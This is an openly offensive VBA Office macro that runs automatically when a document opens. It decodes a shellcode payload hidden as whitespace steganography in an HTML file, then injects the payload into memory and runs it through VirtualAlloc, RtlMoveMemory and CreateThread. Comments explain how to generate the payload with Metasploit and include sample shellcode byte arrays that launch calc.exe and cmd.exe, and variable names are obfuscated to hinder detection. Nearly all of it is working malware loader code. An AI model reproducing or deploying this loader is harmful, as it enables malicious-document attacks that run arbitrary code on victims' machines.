#If VBA7 Then
        Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Tjltfov As Long, ByVal Jcla As Long, ByVal Stvr As LongPtr, Xrrowto As Long, ByVal Vwti As Long, Jjcddy As Long) As LongPtr
        Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Hqcdclzup As Long, ByVal Khjyeyt As Long, ByVal Rbhfhxuhb As Long, ByVal Cylss As Long) As LongPtr
        Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Taxhduoy As LongPtr, ByRef Mwcsrqt As Any, ByVal Rscemetau As Long) As LongPtr
#Else
        Private Declare Function CreateThread Lib "kernel32" (ByVal Tjltfov As Long, ByVal Jcla As Long, ByVal Stvr As Long, Xrrowto As Long, ByVal Vwti As Long, Jjcddy As Long) As Long
        Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Hqcdclzup As Long, ByVal Khjyeyt As Long, ByVal Rbhfhxuhb As Long, ByVal Cylss As Long) As Long
        Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Taxhduoy As Long, ByRef Mwcsrqt As Any, ByVal Rscemetau As Long) As Long
#End If

Sub Auto_Open()
On Error Resume Next

        Dim Kkhdrr As Long, Mxukzuie As Variant, Rspxidfh As Long
#If VBA7 Then
        Dim Cfblg As LongPtr, Bhvdu As LongPtr
#Else
        Dim Cfblg As Long, Bhvdu As Long
#End If
        Dim payload As String
        
' ==========================================
        
        payload = htmlninja("c:\temp\msf_payload.htm") 'INSERT PAYLOAD HTML FILE HERE

' ==========================================
'msf payload(windows/exec) > show options

'Module Options(payload / Windows / exec):

'   Name      Current Setting  Required  Description
'   ----      ---------------  --------  -----------
'   CMD       calc.exe         yes       The command string to execute
'   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)

'msf payload(windows/exec) > generate -t vba

'COPY THE ARRAY VALUE LIKE THIS AS String TO USE IN PAYLOAD:
'        Mxukzuie = Array(232, 130, 0, 0, 0, 96, 137, 229, 49, 192, 100, 139, 80, 48, 139, 82, 12, 139, 82, 20, 139, 114, 40, 15, 183, 74, 38, 49, 255, 172, 60, 97, 124, 2, 44, 32, 193, 207, 13, 1, 199, 226, 242, 82, 87, 139, 82, 16, 139, 74, 60, 139, 76, 17, 120, 227, 72, 1, 209, 81, 139, 89, 32, 1, 211, 139, 73, 24, 227, 58, 73, 139, 52, 139, 1, 214, 49, 255, 172, 193, 207, 13, 1, 199, 56, 224, 117, 246, 3, 125, 248, 59, 125, 36, 117, 228, 88, 139, 88, 36, 1, 211, 102, 139, 12, 75, 139, 88, 28, 1, 211, 139, 4, 139, 1, 208, 137, 68, 36, 36, 91, 91, 97, 89, 90, 81, 255, 224, 95, 95, 90, 139, 18, 235, 141, 93, 106, 1, 141, 133, 178, 0, 0, 0, 80, 104, 49, 139, 111, 135, 255, 213, 187, 240, 181, 162, 86, 104, 166, 149, 189, 157, 255, 213, 60, 6, 124, 10, 128, 251, 224, 117, 5, 187, 71, 19, 114, 111, 106, 0, 83, 255, 213, 99, 97, 108, 99, 46, 101, 120, 101, 0)
'cmdexe = Array(232, 130, 0, 0, 0, 96, 137, 229, 49, 192, 100, 139, 80, 48, 139, 82, 12, 139, 82, 20, 139, 114, 40, 15, 183, 74, 38, 49, 255, 172, 60, 97, 124, 2, 44, 32, 193, 207, 13, 1, 199, 226, 242, 82, 87, 139, 82, 16, 139, 74, 60, 139, 76, 17, 120, 227, 72, 1, 209, 81, 139, 89, 32, 1, 211, 139, 73, 24, 227, 58, 73, 139, 52, 139, 1, 214, 49, 255, 172, 193, 207, 13, 1, 199, 56, 224, 117, 246, 3, 125, 248, 59, 125, 36, 117, 228, 88, 139, 88, 36, 1, 211, 102, 139, 12, 75, 139, 88, 28, 1, 211, 139, 4, 139, 1, 208, 137, 68, 36, 36, 91, 91, 97, 89, 90, 81, 255, 224, 95, 95, 90, 139, 18, 235, 141, 93, 106, 1, 141, 133, 178, 0, 0, 0, 80, 104, 49, 139, 111, 135, 255, 213, 187, 240, 181, 162, 86, 104, 166, 149, 189, 157, 255, 213, 60, 6, 124, 10, 128, 251, 224, 117, 5, 187, 71, 19, 114, 111, 106, 0, 83, 255, 213, 99, 58, 92, 119, 105, 110, 100, 111, 119, 115, 92, 115, 121, 115, 116, 101, 109, 51, 50, 92, 99, 109, 100, 46, 101, 120, 101, 0)
' ==========================================

        Dim arr_payload() As String
        arr_payload = Split(payload, ",")
        Dim arr_payload_final() As Integer
        Dim i As Integer
        i = 0
        For Each Item In arr_payload
            ReDim Preserve arr_payload_final(i)
            arr_payload_final(i) = Int(Trim(Item))
            i = i + 1
        Next
        
        
        Dim Dcql As Long, Dpjgp As Variant, Eol As Long
#If VBA7 Then
        Dim Gwnaigk As LongPtr, Gzdq As LongPtr
#Else
        Dim Gwnaigk As Long, Gzdq As Long
#End If
        Dpjgp = arr_payload_final()
        Gwnaigk = VirtualAlloc(0, UBound(Dpjgp), &H1000, &H40)
        For Eol = LBound(Dpjgp) To UBound(Dpjgp)
                Dcql = Dpjgp(Eol)
                Gzdq = RtlMoveMemory(Gwnaigk + Eol, Dcql, 1)
        Next Eol
        Gzdq = CreateThread(0, 0, Gwnaigk, 0, 0, 0)
End Sub
Sub AutoOpen()
        Auto_Open
End Sub
Sub Workbook_Open()
        Auto_Open
End Sub

Function htmlninja(fpath As String)
On Error Resume Next
    Dim fso As New FileSystemObject
    Dim txt As TextStream
    Dim strText As String

    'read and put file content into string var
    Set txt = fso.OpenTextFile(fpath)
    strText = txt.ReadAll
    txt.Close
    
    Dim lLoop As Long, lCount As Long
    Dim prevchar, bits, c As String

    prevchar = "nil"
    bits = ""
    lCount = Len(strText)
    
    'loop string var and check bits
        For lLoop = 0 To lCount - 1
            c = Mid(strText, lLoop + 1, 1)
            If prevchar = " " Then
                If c = " " Then
                    bits = bits & "1"
                    c = "nil"
                Else
                    bits = bits & "0"
                    c = "nil"
                End If
            End If
            prevchar = c
            
        Next lLoop
        
    'convert bits and run
        'Shell (cmdBinaryToAscii(bits))
    htmlninja = cmdBinaryToAscii(bits)
    
End Function


Private Function cmdBinaryToAscii(bits)
Dim bin As String
Dim result As String
Dim i As Integer
Dim next_char As String
Dim ascii As Long

    bin = bits
    result = ""
    For i = 1 To Len(bin) + 18 Step 8
        next_char = Mid$(bin, i, 8)
        ascii = BinaryToLong(next_char)
        result = result & Chr$(ascii)
    Next i

    cmdBinaryToAscii = result
End Function

' Convert this binary value into a Long.
Private Function BinaryToLong(ByVal binary_value As String) _
    As Long
Dim hex_result As String
Dim nibble_num As Integer
Dim nibble_value As Integer
Dim factor As Integer
Dim bit As Integer

    ' Remove any leading &B if present.
    ' (Note: &B is not a standard prefix, it just
    ' makes some sense.)
    binary_value = UCase$(Trim$(binary_value))
    If Left$(binary_value, 2) = "&B" Then
        binary_value = Mid$(binary_value, 3)
    End If

    ' Strip out spaces in case the bytes are separated
    ' by spaces.
    binary_value = Replace(binary_value, " ", "")

    ' Left pad with zeros so we have a full 32 bits.
    binary_value = Right$(String(32, "0") & _
        binary_value, 32)

    ' Read the bits in nibbles from right to left.
    ' (A nibble is half a byte. No kidding!)
    For nibble_num = 7 To 0 Step -1
        ' Convert this nibble into a hexadecimal string.
        factor = 1
        nibble_value = 0

        ' Read the nibble's bits from right to left.
        For bit = 3 To 0 Step -1
            If Mid$(binary_value, _
                1 + nibble_num * 4 + bit, 1) = "1" _
            Then
                nibble_value = nibble_value + factor
            End If
            factor = factor * 2
        Next bit

        ' Add the nibble's value to the left of the
        ' result hex string.
        hex_result = Hex$(nibble_value) & hex_result
    Next nibble_num

    ' Convert the result string into a long.
    BinaryToLong = CLng("&H" & hex_result)
End Function

